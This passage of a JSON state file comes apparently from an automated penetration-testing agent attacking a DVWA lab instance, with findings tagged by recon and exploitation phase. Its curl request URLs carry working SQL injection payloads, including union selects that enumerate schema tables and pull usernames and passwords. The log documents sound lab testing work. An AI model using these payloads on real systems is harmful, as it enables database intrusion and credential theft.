+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.2/login.php:04c253b9e763",
+      "child": "redirect-status:172.28.0.2/login.php:302 Found",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.2/login.php:04c253b9e763",
+      "child": "cookie-security:172.28.0.2/login.php:security=low",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.2/login.php:04c253b9e763",
+      "child": "cookie-path:172.28.0.2/login.php:/",
+      "weight": 1.0
+    },
+    {
+      "parent": "pruned:172.28.0.2/setup.php:sql-injection-attempt:172.28.0.2/setup.php:no-injection-found",
+      "child": "sql-injection-attempt:172.28.0.2/setup.php:no-injection-found",
+      "weight": 1.0
+    },
+    {
+      "parent": "sql-injection-attempt:172.28.0.2/setup.php:no-injection-found",
+      "child": "info-header:172.28.0.2/setup.php:X-Powered-By",
+      "weight": 1.0
+    },
+    {
+      "parent": "sql-injection-attempt:172.28.0.2/setup.php:no-injection-found",
+      "child": "info-header:172.28.0.2/setup.php:Server",
+      "weight": 1.0
+    },
+    {
+      "parent": "sql-injection-attempt:172.28.0.2/setup.php:no-injection-found",
+      "child": "info-header:172.28.0.2/setup.php:X-Frame-Options",
+      "weight": 1.0
+    },
+    {
+      "parent": "cookie-path:172.28.0.2/login.php:/",
+      "child": "outdated-server-header:172.28.0.2/login.php:Apache/2.4.25 (Debian)",
+      "weight": 1.0
+    },
+    {
+      "parent": "cookie-path:172.28.0.2/login.php:/",
+      "child": "cookie-security-header:172.28.0.2/login.php:security=low",
+      "weight": 1.0
+    },
+    {
+      "parent": "cookie-path:172.28.0.2/login.php:/",
+      "child": "redirect-status:172.28.0.2/login.php:302 Found",
+      "weight": 1.0
+    },
+    {
+      "parent": "info-header:172.28.0.2/index.php:X-Frame-Options: SAMEORIGIN",
+      "child": "curl:172.28.0.2/index.php:469bb09c76b0",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.2/vulnerabilities/sqli:3828861d24c4",
+      "child": "curl:172.28.0.2/vulnerabilities/sqli:99eec3a1ddb5",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,database()--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:f0a3b3064189",
+      "child": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,database()--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:6cc04b32532c",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema%3d%27dvwa%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:9d502d3f57a2",
+      "child": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema%3d%27dvwa%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:53ee8d2593db",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:e0a9d3da4a0f",
+      "child": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:635c1dae4602",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20column_name,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:21db8785c94d",
+      "child": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20column_name,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:56a993ebe875",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:56a993ebe875",
+      "child": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:566d357d06b9",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:635c1dae4602",
+      "child": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:a07fabc03c53",
+      "weight": 1.0
+    },
+    {
+      "parent": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:a07fabc03c53",
+      "child": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20user,password%20from%20users--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:f75a42e6e77e",
+      "weight": 1.0
+    }
+  ],
+  "memory_context": [
+    {
+      "id": "open-port:172.28.0.2:80/tcp",
+      "tier": "T2",
+      "phase_tag": "recon",
+      "salience": 1.2,
+      "age_s": 80360.26906466484,
+      "snippet": "80/tcp http",
+      "hits": 1
+    },
+    {
+      "id": "phase-proposal:recon:phase proposal -> enumeration (pending /phase approval)",
+      "tier": "T2",
+      "phase_tag": "recon",
+      "salience": 1.0,
+      "age_s": 80360.26904082298,
+      "snippet": "phase proposal -> enumeration (pending /phase approval)",
+      "hits": 1
+    },
+    {
+      "id": "waf-absent:172.28.0.2:no-waf-detected",
+      "tier": "T2",
+      "phase_tag": "enumeration",
+      "salience": 1.2,
+      "age_s": 80329.28871393204,
+      "snippet": "no-waf-detected",
+      "hits": 1
+    },
+    {
+      "id": "phase-proposal:enumeration:phase proposal -> vulnerability-discovery (pending /phase approval)",
+      "tier": "T2",
+      "phase_tag": "enumeration",
+      "salience": 1.0,
+      "age_s": 80329.28868627548,
+      "snippet": "phase proposal -> vulnerability-discovery (pending /phase approval)",
+      "hits": 1
+    },
+    {
+      "id": "exposed-path:172.28.0.2:/docs (301)",
+      "tier": "T2",
+      "phase_tag": "vulnerability-discovery",
+      "salience": 1.2,
+      "age_s": 80296.18524384499,
+      "snippet": "/docs (301)",
+      "hits": 1
+    },
+    {
+      "id": "exposed-path:172.28.0.2:/robots.txt (200)",
+      "tier": "T2",
+      "phase_tag": "vulnerability-discovery",
+      "salience": 1.2,
+      "age_s": 80296.18524098396,
+      "snippet": "/robots.txt (200)",
+      "hits": 1
+    },
+    {
+      "id": "exposed-path:172.28.0.2:/config (301)",
+      "tier": "T2",
+      "phase_tag": "vulnerability-discovery",
+      "salience": 1.2,
+      "age_s": 80296.18524003029,
+      "snippet": "/config (301)",
+      "hits": 1
+    },
+    {
+      "id": "exposed-path:172.28.0.2:/phpinfo.php (302)",
+      "tier": "T2",
+      "phase_tag": "vulnerability-discovery",
+      "salience": 1.2,
+      "age_s": 80296.18523955345,
+      "snippet": "/phpinfo.php (302)",
+      "hits": 1
+    },
+    {
+      "id": "exposed-path:172.28.0.2:/setup.php (200)",
+      "tier": "T2",
+      "phase_tag": "vulnerability-discovery",
+      "salience": 1.2,
+      "age_s": 80296.18524098396,
+      "snippet": "/setup.php (200)",
+      "hits": 1
+    },
+    {
+      "id": "phase-proposal:vulnerability-discovery:phase proposal -> exploitation (pending /phase approval)",
+      "tier": "T2",
+      "phase_tag": "vulnerability-discovery",
+      "salience": 1.0,
+      "age_s": 80296.18522667885,
+      "snippet": "phase proposal -> exploitation (pending /phase approval)",
+      "hits": 1
+    },
+    {
+      "id": "info-endpoint:172.28.0.2/phpinfo.php:/admin",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80244.86990380287,
+      "snippet": "An informational endpoint was discovered.",
+      "hits": 1
+    },
+    {
+      "id": "info-endpoint:172.28.0.2/phpinfo.php:/status",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80244.86989569664,
+      "snippet": "An informational endpoint was discovered.",
+      "hits": 1
+    },
+    {
+      "id": "info-header:172.28.0.2/login.php:X-Powered-By",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80140.71573448181,
+      "snippet": "Information disclosure via X-Powered-By header.",
+      "hits": 1
+    },
+    {
+      "id": "info-header:172.28.0.2/login.php:Server",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80140.71573138237,
+      "snippet": "Server software version is disclosed.",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/admin:cd8c09f03e82",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80092.89689731598,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "server-banner:172.28.0.2:Apache/2.4.25 (Debian)",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12352108955,
+      "snippet": "Server: Apache/2.4.25 (Debian)",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[600050] Apache/2.4.25 appears to be outdated (current is at least 2.4.68).",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12351703644,
+      "snippet": "[600050] Apache/2.4.25 appears to be outdated (current is at least 2.4.68).",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12351679802,
+      "snippet": "[013587] /: Suggested security header missing: permissions-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Securi",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12351727486,
+      "snippet": "[013587] /: Suggested security header missing: strict-transport-security. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Securi",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12351799011,
+      "snippet": "[013587] /: Suggested security header missing: x-content-type-options. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12351894379,
+      "snippet": "[013587] /: Suggested security header missing: referrer-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12351942062,
+      "snippet": "[013587] /: Suggested security header missing: content-security-policy. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[750500] /config/: Directory indexing found. See: CWE-548",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12351942062,
+      "snippet": "[750500] /config/: Directory indexing found. See: CWE-548",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[000998] /config/: Configuration information may be available remotely.",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12352108955,
+      "snippet": "[000998] /config/: Configuration information may be available remotely.",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[750500] /docs/: Directory indexing found. See: CWE-548",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12352180481,
+      "snippet": "[750500] /docs/: Directory indexing found. See: CWE-548",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[003584] /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12352204323,
+      "snippet": "[003584] /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[006333] /login.php: Admin login page/section found.",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12352395058,
+      "snippet": "[006333] /login.php: Admin login page/section found.",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[007224] /.gitignore: .gitignore file found. It is possible to grasp the directory structure.",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12352466583,
+      "snippet": "[007224] /.gitignore: .gitignore file found. It is possible to grasp the directory structure.",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[007342] /: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive. See: https://",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12352490425,
+      "snippet": "[007342] /: X-Frame-Options header is deprecated and was replaced with the Content-Security-Policy HTTP header with the frame-ancestors directive. See: https://",
+      "hits": 1
+    },
+    {
+      "id": "nikto-finding:172.28.0.2:[007352] /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME t",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 80038.12352514267,
+      "snippet": "[007352] /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME t",
+      "hits": 1
+    },
+    {
+      "id": "tool-failure:exploitation:tooltimeouterror: sqlmap: timed out after 90s",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.0,
+      "age_s": 79893.77827715874,
+      "snippet": "ToolTimeoutError: sqlmap: timed out after 90s",
+      "hits": 2
+    },
+    {
+      "id": "outdated-server-header:172.28.0.2/etc/passwd:Apache/2.4.25 (Debian)",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 79832.58337783813,
+      "snippet": "The server is running a specific version of Apache.",
+      "hits": 1
+    },
+    {
+      "id": "credential-found:172.28.0.2/setup.php:password=<em>******</em><br",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 79781.42752099037,
+      "snippet": "password=<em>******</em><br",
+      "hits": 1
+    },
+    {
+      "id": "info-header:172.28.0.2/login.php:X-Powered-By: PHP/7.4",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 79715.85211634636,
+      "snippet": "The server reveals its PHP version.",
+      "hits": 2
+    },
+    {
+      "id": "curl:172.28.0.2/login.php:04c253b9e763",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 79480.57290029526,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 3
+    },
+    {
+      "id": "outdated-server-header:172.28.0.2/instructions.php:DVWA v1.10",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 79407.29591441154,
+      "snippet": "The application is running a known vulnerable version.",
+      "hits": 1
+    },
+    {
+      "id": "application-info-disclosure:172.28.0.2/instructions.php:DVWA",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 79407.29590964317,
+      "snippet": "The application lists an older stable version.",
+      "hits": 1
+    },
+    {
+      "id": "application-info-disclosure:172.28.0.2/instructions.php:DVWA v1.0.7",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 79407.2959086895,
+      "snippet": "The application lists an older live CD version.",
+      "hits": 1
+    },
+    {
+      "id": "outdated-server-header:172.28.0.2/login.php:Apache/2.4.25 (Debian)",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 79335.1898446083,
+      "snippet": "The server is running a potentially outdated Apache version.",
+      "hits": 2
+    },
+    {
+      "id": "redirect-status:172.28.0.2/login.php:302 Found",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 79335.1898393631,
+      "snippet": "The initial request resulted in a redirection.",
+      "hits": 2
+    },
+    {
+      "id": "cookie-security:172.28.0.2/login.php:security=low",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 79335.18983888626,
+      "snippet": "A cookie was set with a low security designation.",
+      "hits": 1
+    },
+    {
+      "id": "cookie-path:172.28.0.2/login.php:/",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 79335.18983912468,
+      "snippet": "A session cookie is set for the entire site path.",
+      "hits": 1
+    },
+    {
+      "id": "sql-injection-attempt:172.28.0.2/setup.php:no-injection-found",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78840.54716300964,
+      "snippet": "ToolTimeoutError: sqlmap: timed out after 90s",
+      "hits": 1
+    },
+    {
+      "id": "info-header:172.28.0.2/setup.php:X-Powered-By",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78748.71522855759,
+      "snippet": "Information disclosure via X-Powered-By header.",
+      "hits": 1
+    },
+    {
+      "id": "info-header:172.28.0.2/setup.php:Server",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78748.71522426605,
+      "snippet": "Server software version is disclosed.",
+      "hits": 1
+    },
+    {
+      "id": "info-header:172.28.0.2/setup.php:X-Frame-Options",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78748.71522307396,
+      "snippet": "X-Frame-Options header is present and restrictive.",
+      "hits": 1
+    },
+    {
+      "id": "cookie-security-header:172.28.0.2/login.php:security=low",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78687.93198657036,
+      "snippet": "The session cookie is marked with a low security setting.",
+      "hits": 1
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:X-Powered-By: PHP/7.4",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78623.09370708466,
+      "snippet": "The server reveals its PHP version.",
+      "hits": 1
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:Server: nginx/1.18.0",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78623.09369874,
+      "snippet": "The server reveals its Nginx version.",
+      "hits": 1
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:X-Frame-Options: SAMEORIGIN",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78623.09369683266,
+      "snippet": "The site implements a frame-busting policy.",
+      "hits": 1
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:Strict-Transport-Security",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78623.09369587898,
+      "snippet": "The site enforces HSTS.",
+      "hits": 1
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:Content-Security-Policy",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78623.09369564056,
+      "snippet": "The site implements CSP.",
+      "hits": 1
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:X-Content-Type-Options: nosniff",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78623.09369492531,
+      "snippet": "The site prevents MIME type sniffing.",
+      "hits": 1
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:X-Custom-Header",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78623.09369468689,
+      "snippet": "A custom header is present.",
+      "hits": 1
+    },
+    {
+      "id": "info-header:172.28.0.2/index.php:Missing-Header",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78623.0936973095,
+      "snippet": "A security header is missing.",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/index.php:469bb09c76b0",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78567.33960795403,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli:3828861d24c4",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78299.78871655464,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "outdated-server-header:172.28.0.2/security.php:Apache/2.4.25 (Debian)",
+      "tier": "T2",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78260.5622036457,
+      "snippet": "The server is running a potentially outdated Apache version.",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli:99eec3a1ddb5",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 78109.22585749626,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?user_token=a7299c249dd674cf4cdc275e554efe01\":d149a9f16263",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 77984.84097766876,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27+or+%271%27=%271&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:116547b48cbe",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 77760.06407785416,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "tool-failure:exploitation:toolexecutionerror: curl exited 3 curl: (3) url rejected: malformed input to a url function",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.0,
+      "age_s": 77652.76182866096,
+      "snippet": "ToolExecutionError: curl exited 3\ncurl: (3) URL rejected: Malformed input to a URL function\n",
+      "hits": 3
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%20order%20by%203--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:54915392e9ae",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 77451.17441248894,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20order%20by%203--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:48de91f37473",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 77359.73307490349,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20order%20by%204--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:48de91f37473",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 77302.64935517311,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%20union%20select%201,%20version(),3--&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:cdf6f1cd28e9",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 68497.681224823,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,version()--%20-&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:e512a1a6a299",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 68423.49010276794,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,database()--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:f0a3b3064189",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 68340.75192546844,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,database()--%20-&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:d7c1554cd886",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 68218.1101539135,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,database()--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:6cc04b32532c",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 68158.72243666649,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema%3d%27dvwa%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:9d502d3f57a2",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 68083.76560139656,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema%3d%27dvwa%27--%20-&submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:2a9a4192b7c8",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 68009.99076986313,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema%3d%27dvwa%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:53ee8d2593db",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 67940.00050663948,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%20column_name,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:21db8785c94d",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
+      "age_s": 67861.16859769821,
+      "snippet": "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\u2026",
+      "hits": 1
+    },
+    {
+      "id": "curl:172.28.0.2/vulnerabilities/sqli/?id=1%27%20union%20select%201,2%20from%20information_schema.columns%20where%20table_name%3d%27users%27--%20-%26submit=submit&user_token=ec70f7d86ed11cfdd3688c4fed1d7f1d:56a993ebe875",
+      "tier": "T3",
+      "phase_tag": "exploitation",
+      "salience": 1.2,
